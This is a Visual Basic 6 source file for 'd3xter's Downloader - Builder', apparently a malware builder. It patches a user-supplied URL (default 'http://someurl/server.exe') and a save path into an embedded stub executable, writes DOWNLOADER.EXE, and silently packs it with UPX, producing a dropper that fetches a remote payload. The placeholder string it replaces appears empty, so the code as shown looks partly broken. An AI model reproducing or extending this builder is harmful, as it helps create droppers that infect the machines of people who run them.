VERSION 5.00
Begin VB.Form fMain 
   BorderStyle     =   3  'Fester Dialog
   Caption         =   "d3xter's Downloader - Builder"
   ClientHeight    =   1680
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   6615
   Icon            =   "fMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1680
   ScaleWidth      =   6615
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.TextBox txt 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      IMEMode         =   3  'DISABLE
      Index           =   1
      Left            =   1200
      LinkTimeout     =   20
      MaxLength       =   50
      TabIndex        =   3
      Text            =   "C:\1.exe"
      Top             =   600
      Width           =   5295
   End
   Begin VB.TextBox txt 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      IMEMode         =   3  'DISABLE
      Index           =   0
      Left            =   1200
      LinkTimeout     =   20
      MaxLength       =   100
      TabIndex        =   1
      Text            =   "http://someurl/server.exe"
      Top             =   120
      Width           =   5295
   End
   Begin VB.CommandButton cmdBuild 
      Caption         =   "Build"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   11.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   4680
      TabIndex        =   0
      Top             =   1080
      Width           =   1815
   End
   Begin VB.Label Label 
      Caption         =   "Save To:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Index           =   0
      Left            =   120
      TabIndex        =   4
      Top             =   600
      Width           =   1815
   End
   Begin VB.Label Label 
      Caption         =   "Path:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Index           =   7
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   1815
   End
End
Attribute VB_Name = "fMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False



Private Sub cmdBuild_Click()
  On Error Resume Next
  
  
  Dim tString As String
  
  tString = txt(0) & vbCrLf & txt(1)
  
  
  tString = tString & String(150 - Len(tString), 1)
  
  Dim ff As Long: ff = FreeFile

  Dim bb() As Byte
  bb = LoadResData(101, "CUSTOM")
  
  Dim tmp As String
  tmp = StrConv(bb, vbUnicode)
  
  Const d = ""

 
  
  tmp = Replace(tmp, StrConv(d, vbUnicode), StrConv(tString, vbUnicode))
  
  Dim bb2() As Byte
  bb2 = StrConv(tmp, vbFromUnicode)
  
  Open App.Path & "\DOWNLOADER.EXE" For Binary As #ff
  Put #ff, , bb2
  Close #ff
  
  tPID = Shell("""" & App.Path & "\upx.exe" & """ """ & App.Path & "\DOWNLOADER.EXE""", vbHide)
    
  If tPID = 0 Then
    MsgBox "Unable to Pack EXE?!", vbExclamation
  End If
  
  

  
  MsgBox "downloader.exe successfully built", vbInformation
End Sub



